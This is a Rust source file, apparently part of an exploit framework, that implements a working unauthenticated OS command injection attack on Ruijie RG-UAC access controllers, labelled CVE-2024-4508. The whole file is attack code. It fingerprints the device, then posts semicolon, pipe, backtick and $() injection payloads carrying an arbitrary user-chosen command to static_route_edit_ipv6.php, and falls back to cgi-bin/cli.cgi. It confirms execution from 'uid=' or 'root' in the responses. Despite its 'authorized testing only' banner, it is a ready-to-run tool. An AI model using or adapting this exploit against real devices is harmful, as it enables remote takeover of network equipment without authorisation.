//! Ruijie RG-UAC OS Command Injection (CVE-2024-4508)
//!
//! **Vulnerability**: Critical unauthenticated command injection
//! **Affected**: RG-UAC (Unified Access Controller)
//! **CVSS**: 9.8 (Critical)
//! **Requirements**: Network access to device web interface
//!
//! ## Attack:
//! Inject OS commands via static_route_edit_ipv6.php route parameters
//! Multiple injection vectors: semicolon, pipe, backtick, $()
//!
//! FOR AUTHORIZED SECURITY TESTING ONLY

use anyhow::{anyhow, Context, Result};
use colored::Colorize;
use reqwest::Client;
use std::io::Write;
use std::time::Duration;

use crate::utils::prompt_yes_no;

// ============================================================================
// CONSTANTS
// ============================================================================

const DEFAULT_TIMEOUT_SECS: u64 = 10;
const USER_AGENT: &str = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) RuijieExploit/1.0";

// ============================================================================
// CONFIGURATION
// ============================================================================

struct ExploitConfig {
    target_url: String,
    command: String,
    timeout_secs: u64,
    verify_ssl: bool,
    try_all_vectors: bool,
}

impl ExploitConfig {
    fn get_primary_endpoint(&self) -> String {
        format!("{}/static_route_edit_ipv6.php", self.target_url)
    }
    
    fn get_alternate_endpoint(&self) -> String {
        format!("{}/cgi-bin/cli.cgi", self.target_url)
    }
    
    fn get_injection_payloads(&self) -> Vec<(String, &'static str)> {
        vec![
            (format!(";{};", self.command), "semicolon"),
            (format!("|{}", self.command), "pipe"),
            (format!("$({})", self.command), "command substitution"),
            (format!("`{}`", self.command), "backtick"),
        ]
    }
    
    fn get_timeout(&self) -> Duration {
        Duration::from_secs(self.timeout_secs)
    }
}

// ============================================================================
// HTTP CLIENT
// ============================================================================

fn build_client(config: &ExploitConfig) -> Result<Client> {
    Client::builder()
        .danger_accept_invalid_certs(!config.verify_ssl)
        .timeout(config.get_timeout())
        .user_agent(USER_AGENT)
        .build()
        .context("Failed to build HTTP client")
}

// ============================================================================
// EXPLOIT LOGIC
// ============================================================================

async fn execute_injection(client: &Client, config: &ExploitConfig) -> Result<String> {
    let exploit_url = config.get_primary_endpoint();
    
    println!("{}", format!("[*] Primary endpoint: {}", exploit_url).blue());
    println!("{}", format!("[*] Command: {}", config.command).cyan());
    println!("{}", format!("[*] Try all vectors: {}", if config.try_all_vectors { "yes" } else { "no" }).cyan());
    
    for (injection, vector_name) in config.get_injection_payloads() {
        println!("{}", format!("[*] Trying {} injection...", vector_name).dimmed());
        
        let payload = serde_json::json!({
            "action": "add",
            "destination": injection,
            "gateway": "fe80::1",
            "interface": "eth0"
        });
        
        let resp = match client.post(&exploit_url).json(&payload).send().await {
            Ok(r) => r,
            Err(e) => {
                println!("{}", format!("[-] Request failed: {}", e).red());
                if !config.try_all_vectors {
                    return Err(anyhow!("Request failed: {}", e));
                }
                continue;
            }
        };
        
        let status = resp.status();
        let text = match resp.text().await {
            Ok(t) => t,
            Err(e) => {
                println!("{}", format!("[*] Failed to read response: {}", e).dimmed());
                if !config.try_all_vectors { return Err(anyhow!("Failed to read response")); }
                continue;
            }
        };
        
        // Check for command execution signs
        if text.contains("uid=") || text.contains("root") || text.contains("gid=") {
            println!("{}", "[+] COMMAND INJECTION SUCCESSFUL!".green().bold());
            println!("{}", "[VULN] Device is VULNERABLE to CVE-2024-4508".red().bold());
            println!("{}", format!("[+] Injection vector: {}", vector_name).green());
            println!("{}", "[+] Output:".green());
            for line in text.lines().take(15) {
                println!("    {}", line);
            }
            return Ok(text);
        }
        
        if status.is_success() {
            println!("{}", format!("[*] HTTP {} - checking response...", status).yellow());
            if !text.is_empty() && text.len() < 500 {
                println!("{}", format!("[*] Response: {}", text).dimmed());
            }
        }
        
        if !config.try_all_vectors {
            break;
        }
    }
    
    Err(anyhow!("Command injection not confirmed via primary endpoint"))
}

async fn try_alternate_endpoint(client: &Client, config: &ExploitConfig) -> Result<String> {
    let alt_url = config.get_alternate_endpoint();
    println!("{}", format!("[*] Trying alternate endpoint: {}", alt_url).blue());
    
    let payload = format!("cmd=show%20version;{}", urlencoding::encode(&config.command));
    
    let resp = client
        .post(&alt_url)
        .header("Content-Type", "application/x-www-form-urlencoded")
        .body(payload)
        .send()
        .await
        .context("Failed to send to alternate endpoint")?;
    
    let text = match resp.text().await {
        Ok(t) => t,
        Err(e) => {
            println!("{}", format!("[!] Failed to read response: {}", e).yellow());
            return Err(anyhow!("Failed to read alternate endpoint response"));
        }
    };
    
    if !text.is_empty() {
        println!("{}", format!("[*] Alternate endpoint response: {}", &text[..text.len().min(300)]).cyan());
        
        if text.contains("uid=") || text.contains("root") {
            println!("{}", "[+] Command execution confirmed on alternate endpoint!".green().bold());
            return Ok(text);
        }
    }
    
    Err(anyhow!("Alternate endpoint did not confirm injection"))
}

/// Fingerprint the target
async fn check_fingerprint(client: &Client, config: &ExploitConfig) -> bool {
    println!("{}", "[*] Fingerprinting target...".blue());
    
    let resp = match client.get(&config.target_url).send().await {
        Ok(r) => r,
        Err(_) => return false,
    };
    
    let body = match resp.text().await {
        Ok(t) => t,
        Err(_) => return false,
    };
    let body_lower = body.to_lowercase();
    
    let is_ruijie_uac = body_lower.contains("ruijie") 
        || body_lower.contains("rg-uac")
        || body_lower.contains("unified access");
    
    if is_ruijie_uac {
        println!("{}", "[+] Target appears to be Ruijie RG-UAC".green());
    } else {
        println!("{}", "[*] Could not confirm RG-UAC device".yellow());
    }
    
    is_ruijie_uac
}

// ============================================================================
// MAIN ENTRY POINT
// ============================================================================

pub async fn run(target: &str) -> Result<()> {
    display_banner();
    
    // Gather configuration
    let config = gather_config(target)?;
    
    // Build client
    let client = build_client(&config)?;
    
    // Display config
    println!("\n{}", "=== Starting Exploit ===".bold());
    println!("{}", format!("[*] Target URL: {}", config.target_url).cyan());
    println!("{}", format!("[*] Timeout: {}s", config.timeout_secs).cyan());
    println!("{}", format!("[*] SSL Verify: {}", if config.verify_ssl { "yes" } else { "no" }).cyan());
    
    // Fingerprint
    check_fingerprint(&client, &config).await;
    
    // Try primary exploit
    match execute_injection(&client, &config).await {
        Ok(output) => {
            println!("\n{}", "=== Exploit Successful ===".green().bold());
            println!("{}", format!("Command output length: {} bytes", output.len()).cyan());
        }
        Err(_) => {
            // Try alternate endpoint
            match try_alternate_endpoint(&client, &config).await {
                Ok(_) => {
                    println!("\n{}", "=== Exploit Successful (alternate) ===".green().bold());
                }
                Err(_) => {
                    println!("\n{}", "[-] Could not confirm vulnerability.".red());
                    println!("{}", "[*] Ensure target is running Ruijie RG-UAC.".yellow());
                }
            }
        }
    }
    
    Ok(())
}

fn display_banner() {
    println!("{}", r#"
╔═══════════════════════════════════════════════════════════════╗
║   Ruijie RG-UAC Command Injection (CVE-2024-4508)             ║
║   Unauthenticated OS command injection                        ║
║   CVSS: 9.8 Critical | Unauthenticated                        ║
╚═══════════════════════════════════════════════════════════════╝
"#.cyan().bold());
    
    println!("{}", "[!] FOR AUTHORIZED SECURITY TESTING ONLY\n".yellow().bold());
}

fn gather_config(initial_target: &str) -> Result<ExploitConfig> {
    // Get target URL
    let target_url = if initial_target.starts_with("http") {
        initial_target.trim_end_matches('/').to_string()
    } else if !initial_target.is_empty() {
        format!("http://{}", initial_target.trim_end_matches('/'))
    } else {
        print!("{}", "Target IP/URL: ".green());
        std::io::stdout().flush()?;
        let mut input = String::new();
        std::io::stdin().read_line(&mut input)?;
        let input = input.trim();
        if input.is_empty() {
            return Err(anyhow!("Target is required"));
        }
        if input.starts_with("http") {
            input.trim_end_matches('/').to_string()
        } else {
            format!("http://{}", input.trim_end_matches('/'))
        }
    };
    
    // Command to execute
    print!("{}", "Command to execute [id]: ".green());
    std::io::stdout().flush()?;
    let mut command = String::new();
    std::io::stdin().read_line(&mut command)?;
    let command = command.trim();
    let command = if command.is_empty() { "id".to_string() } else { command.to_string() };
    
    // Try all injection vectors
    let try_all_vectors = prompt_yes_no("Try all injection vectors?", true)?;
    
    // Timeout
    print!("{}", format!("Timeout seconds [{}]: ", DEFAULT_TIMEOUT_SECS).green());
    std::io::stdout().flush()?;
    let mut timeout_input = String::new();
    std::io::stdin().read_line(&mut timeout_input)?;
    let timeout_secs = timeout_input.trim().parse().unwrap_or(DEFAULT_TIMEOUT_SECS);
    
    // SSL verification
    let verify_ssl = !prompt_yes_no("Skip SSL verification?", true)?;
    
    let config = ExploitConfig {
        target_url,
        command,
        timeout_secs,
        verify_ssl,
        try_all_vectors,
    };
    
    // Show config summary
    println!("\n{}", "=== Configuration ===".bold());
    println!("  Target:      {}", config.target_url);
    println!("  Primary EP:  {}", config.get_primary_endpoint());
    println!("  Alternate:   {}", config.get_alternate_endpoint());
    println!("  Command:     {}", config.command);
    println!("  All Vectors: {}", if config.try_all_vectors { "yes" } else { "no" });
    println!("  Timeout:     {}s", config.timeout_secs);
    println!("  SSL:         {}", if config.verify_ssl { "verified" } else { "skip" });
    
    if !prompt_yes_no("\nProceed with exploit?", true)? {
        return Err(anyhow!("Cancelled by user"));
    }
    
    Ok(config)
}
